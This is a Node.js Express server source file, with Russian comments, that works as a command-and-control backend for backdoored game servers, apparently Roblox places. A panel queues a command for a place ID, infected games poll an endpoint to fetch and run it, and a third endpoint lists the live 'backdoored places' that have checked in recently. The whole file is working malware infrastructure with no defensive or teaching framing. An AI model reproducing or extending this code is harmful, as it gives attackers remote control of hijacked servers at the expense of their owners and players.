const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

let scriptQueue = {};
let activePlaces = {}; // Хранит активные плейсы, которые выходили на связь

// Принимает команду от панели
app.post('/set-script', (req, res) => {
    const { placeId, command } = req.body;
    if (placeId && command) {
        scriptQueue[placeId] = command;
        res.json({ success: true });
    } else {
        res.status(400).json({ success: false });
    }
});

// Игра забирает команду и подтверждает свою активность
app.get('/get-script', (req, res) => {
    const placeId = req.query.placeId;
    if (placeId) {
        // Фиксируем, что этот плейс в сети
        activePlaces[placeId] = Date.now();

        if (scriptQueue[placeId]) {
            const cmdToRun = scriptQueue[placeId];
            delete scriptQueue[placeId];
            return res.send(cmdToRun);
        }
    }
    res.send("");
});

// Сайт запрашивает список активных забекдоренных плейсов
app.get('/active-places', (req, res) => {
    // Удаляем те, которые молчали больше 30 секунд (сервер удалили или закрыли)
    const now = Date.now();
    for (let id in activePlaces) {
        if (now - activePlaces[id] > 30000) {
            delete activePlaces[id];
        }
    }
    res.json(Object.keys(activePlaces));
});

app.listen(PORT, () => {
    console.log(`Server is running`);
});
           
